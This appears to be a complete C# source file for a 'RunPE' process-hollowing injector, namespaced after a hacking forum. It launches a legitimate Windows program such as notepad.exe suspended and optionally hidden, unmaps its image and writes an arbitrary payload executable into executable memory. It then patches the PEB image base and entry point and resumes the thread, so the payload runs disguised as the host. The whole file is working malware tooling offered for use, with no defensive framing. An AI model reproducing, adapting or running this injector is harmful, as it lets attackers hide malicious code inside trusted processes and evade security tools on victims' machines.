// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:x64 /unsafe /out:WinXRunPE_AMD64.exe WinXRunPE_AMD64.cs

using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HackForums.gigajew
{
    public class WinXParameters
    {
        public byte[] Payload;
        public string HostFileName;
        public string[] Arguments;
        public bool Hidden;

        public static WinXParameters Create(byte[] payload, string hostFileName, bool hidden, params string[] arguments)
        {
            WinXParameters parameters = new WinXParameters();
            parameters.HostFileName = hostFileName;
            parameters.Payload = payload;
            parameters.Arguments = arguments;
            parameters.Hidden = hidden;
            return parameters;
        }

        public string GetFormattedHostFileName()
        {
            if (Arguments != null)
            {
                if (Arguments.Length > 0)
                {
                    return string.Format("{0} {1}", HostFileName, string.Join(" ", Arguments));
                }
            }
            return HostFileName;
        }
    }

    public static unsafe class WinXRunPE_AMD64
    {
        public static bool Inject(WinXParameters parameters)
        {
            string currentDir;
            var entry = Assembly.GetEntryAssembly();
            if (entry != null)
                currentDir = Path.GetDirectoryName(entry.Location);
            else
                currentDir = Directory.GetCurrentDirectory();

            ProcessInfo processInfo = new ProcessInfo();
            _CONTEXT_AMD64 context = new _CONTEXT_AMD64();
            context.ContextFlags = 0x10001b;

            fixed (byte* pBufferUnsafe = parameters.Payload)
            {
                IntPtr pBuffer = (IntPtr)pBufferUnsafe;
                _IMAGE_DOS_HEADER* dosHeader = (_IMAGE_DOS_HEADER*)(pBufferUnsafe);
                _IMAGE_NT_HEADERS64* ntHeaders = (_IMAGE_NT_HEADERS64*)(pBufferUnsafe + (dosHeader->e_lfanew));

                // security checks
                if (dosHeader->e_magic != 0x5A4D || ntHeaders->Signature != 0x00004550)
                {
                    throw new Win32Exception("Not a valid Win32 PE!");
                }

                if (ntHeaders->OptionalHeader.Magic != 0x20b)
                {
                    throw new Exception("This RunPE only supports AMD64-built executables!");
                }

                // create suspended process
                STARTUPINFO startupInfo = new STARTUPINFO();
                startupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));

                if (!CreateProcess(null, parameters.GetFormattedHostFileName(), IntPtr.Zero, IntPtr.Zero, false, parameters.Hidden ? 0x00000004u | 0x08000000u : 0x00000004u, IntPtr.Zero, currentDir, &startupInfo, &processInfo))
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] CreateProcess failed with error: " + err);
                    if (processInfo.hProcess != IntPtr.Zero)
                    {
                        TerminateProcess(processInfo.hProcess, -1);
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                    }
                    return false;
                }

                Console.WriteLine("[+] Created suspended process");
                Console.WriteLine("    PID:   " + processInfo.dwProcessId);
                Console.WriteLine("    TID:   " + processInfo.dwThreadId);
                Console.WriteLine("    hProc: 0x" + processInfo.hProcess.ToString("X"));
                Console.WriteLine("    hThrd: 0x" + processInfo.hThread.ToString("X"));

                // unmap
                IntPtr pImageBase = (IntPtr)(long)(ntHeaders->OptionalHeader.ImageBase);
                Console.WriteLine("[*] Target ImageBase: 0x" + pImageBase.ToString("X"));

                NtUnmapViewOfSection(processInfo.hProcess, pImageBase);

                // allocate
                if (VirtualAllocEx(processInfo.hProcess, pImageBase, ntHeaders->OptionalHeader.SizeOfImage, 0x3000u, 0x40u) == IntPtr.Zero)
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] VirtualAllocEx failed with error: " + err);
                    TerminateProcess(processInfo.hProcess, -1);
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    return false;
                }

                Console.WriteLine("[+] Allocated 0x" + ntHeaders->OptionalHeader.SizeOfImage.ToString("X") + " bytes at 0x" + pImageBase.ToString("X"));

                // copy image headers
                if (!WriteProcessMemory(processInfo.hProcess, pImageBase, pBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, IntPtr.Zero))
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] WriteProcessMemory (headers) failed with error: " + err);
                    TerminateProcess(processInfo.hProcess, -1);
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    return false;
                }

                Console.WriteLine("[+] Wrote PE headers");

                // copy sections
                for (ushort i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
                {
                    _IMAGE_SECTION_HEADER* section = (_IMAGE_SECTION_HEADER*)(pBuffer.ToInt64() + (dosHeader->e_lfanew) + Marshal.SizeOf(typeof(_IMAGE_NT_HEADERS64)) + (Marshal.SizeOf(typeof(_IMAGE_SECTION_HEADER)) * i));

                    Console.WriteLine("[*] Writing section " + i + ": VA=0x" + section->VirtualAddress.ToString("X") + " Size=0x" + section->SizeOfRawData.ToString("X"));

                    if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(pImageBase.ToInt64() + (section->VirtualAddress)), (IntPtr)(pBuffer.ToInt64() + (section->PointerToRawData)), section->SizeOfRawData, IntPtr.Zero))
                    {
                        int err = Marshal.GetLastWin32Error();
                        Console.WriteLine("[!] WriteProcessMemory (section " + i + ") failed with error: " + err);
                        TerminateProcess(processInfo.hProcess, -1);
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                        return false;
                    }
                }

                // get thread context
                if (!GetThreadContext(processInfo.hThread, &context))
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] GetThreadContext failed with error: " + err);
                    TerminateProcess(processInfo.hProcess, -1);
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    return false;
                }

                Console.WriteLine("[+] Got thread context: RCX=0x" + context.Rcx.ToString("X") + " RDX=0x" + context.Rdx.ToString("X"));

                // patch imagebase in PEB
                // x64: RDX points to PEB, PEB+0x10 = ImageBaseAddress
                IntPtr address = Marshal.AllocHGlobal(8);
                ulong puImageBase = (ulong)pImageBase.ToInt64();
                byte[] pbImageBase = new byte[8];
                pbImageBase[0] = (byte)(puImageBase >> 0);
                pbImageBase[1] = (byte)(puImageBase >> 8);
                pbImageBase[2] = (byte)(puImageBase >> 16);
                pbImageBase[3] = (byte)(puImageBase >> 24);
                pbImageBase[4] = (byte)(puImageBase >> 32);
                pbImageBase[5] = (byte)(puImageBase >> 40);
                pbImageBase[6] = (byte)(puImageBase >> 48);
                pbImageBase[7] = (byte)(puImageBase >> 56);
                Marshal.Copy(pbImageBase, 0, address, 8);

                Console.WriteLine("[*] Patching PEB ImageBase at RDX+0x10 = 0x" + (context.Rdx + 16).ToString("X"));

                if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(context.Rdx + 16ul), address, 8u, IntPtr.Zero))
                {
                    Marshal.FreeHGlobal(address);
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] WriteProcessMemory (PEB patch) failed with error: " + err);
                    TerminateProcess(processInfo.hProcess, -1);
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    return false;
                }
                Marshal.FreeHGlobal(address);

                // patch entrypoint
                // x64: RCX = EntryPoint on initial thread start
                context.Rcx = (ulong)(pImageBase.ToInt64() + (ntHeaders->OptionalHeader.AddressOfEntryPoint));
                Console.WriteLine("[+] New EntryPoint: RCX=0x" + context.Rcx.ToString("X"));

                // set context
                if (!SetThreadContext(processInfo.hThread, &context))
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] SetThreadContext failed with error: " + err);
                    TerminateProcess(processInfo.hProcess, -1);
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    return false;
                }

                // resume thread
                ResumeThread(processInfo.hThread);
                Console.WriteLine("[+] Thread resumed");

                // cleanup
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);
                return true;
            }
        }

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CreateProcess(
            [MarshalAs(UnmanagedType.LPTStr)]string lpApplicationName,
            [MarshalAs(UnmanagedType.LPTStr)]string lpCommandLine,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpProcessAttributes,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpThreadAttributes,
            [MarshalAs(UnmanagedType.Bool)]bool bInheritHandles,
            [MarshalAs(UnmanagedType.U4)]uint dwCreationFlags,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpEnvironment,
            [MarshalAs(UnmanagedType.LPTStr)]string lpCurrentDirectory,
            STARTUPINFO* lpStartupInfo,
            ProcessInfo* lpProcessInfo);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool TerminateProcess([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess, [MarshalAs(UnmanagedType.I4)]int exitCode);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle([MarshalAs(UnmanagedType.SysInt)]IntPtr hObject);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT_AMD64* pContext);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT_AMD64* pContext);

        [DllImport("ntdll.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.U4)]
        private static extern uint NtUnmapViewOfSection([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess, [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.SysInt)]
        private static extern IntPtr VirtualAllocEx(
            [MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpAddress,
            [MarshalAs(UnmanagedType.U4)]uint dwSize,
            [MarshalAs(UnmanagedType.U4)]uint flAllocationType,
            [MarshalAs(UnmanagedType.U4)]uint flProtect);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool WriteProcessMemory(
            [MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBaseAddress,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBuffer,
            [MarshalAs(UnmanagedType.U4)]uint nSize,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.U4)]
        private static extern uint ResumeThread([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ProcessInfo
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x28)]
    public struct _IMAGE_SECTION_HEADER
    {
        [FieldOffset(0xc)]
        public UInt32 VirtualAddress;
        [FieldOffset(0x10)]
        public UInt32 SizeOfRawData;
        [FieldOffset(0x14)]
        public UInt32 PointerToRawData;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x14)]
    public struct _IMAGE_FILE_HEADER
    {
        [FieldOffset(0x02)]
        public ushort NumberOfSections;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x40)]
    public struct _IMAGE_DOS_HEADER
    {
        [FieldOffset(0x00)]
        public ushort e_magic;
        [FieldOffset(0x3c)]
        public uint e_lfanew;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x108)]
    public struct _IMAGE_NT_HEADERS64
    {
        [FieldOffset(0x00)]
        public uint Signature;
        [FieldOffset(0x04)]
        public _IMAGE_FILE_HEADER FileHeader;
        [FieldOffset(0x18)]
        public _IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0xf0)]
    public struct _IMAGE_OPTIONAL_HEADER64
    {
        [FieldOffset(0x00)]
        public ushort Magic;
        [FieldOffset(0x010)]
        public uint AddressOfEntryPoint;
        [FieldOffset(0x18)]
        public ulong ImageBase;
        [FieldOffset(0x38)]
        public uint SizeOfImage;
        [FieldOffset(0x3c)]
        public uint SizeOfHeaders;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x4d0)]
    public struct _CONTEXT_AMD64
    {
        [FieldOffset(0x30)]
        public uint ContextFlags;
        [FieldOffset(0x80)]
        public ulong Rcx;
        [FieldOffset(0x88)]
        public ulong Rdx;
    }

    public class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: WinXRunPE_AMD64.exe <payload_x64.exe> <host_x64.exe>");
                Console.WriteLine("Example: WinXRunPE_AMD64.exe payload.exe C:\\Windows\\System32\\notepad.exe");
                return;
            }

            string payloadPath = args[0];
            string hostPath = args[1];

            if (!File.Exists(payloadPath))
            {
                Console.WriteLine("[-] Payload file not found: " + payloadPath);
                return;
            }

            if (!File.Exists(hostPath))
            {
                Console.WriteLine("[-] Host file not found: " + hostPath);
                return;
            }

            Console.WriteLine("[*] Payload: " + payloadPath);
            Console.WriteLine("[*] Host:    " + hostPath);

            byte[] payload = File.ReadAllBytes(payloadPath);
            Console.WriteLine("[*] Payload size: " + payload.Length + " bytes");

            WinXParameters parameters = WinXParameters.Create(
                payload,
                hostPath,
                false
            );

            try
            {
                bool result = WinXRunPE_AMD64.Inject(parameters);
                if (result)
                    Console.WriteLine("[+] Injection successful");
                else
                    Console.WriteLine("[-] Injection failed");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Exception: " + ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }
    }
}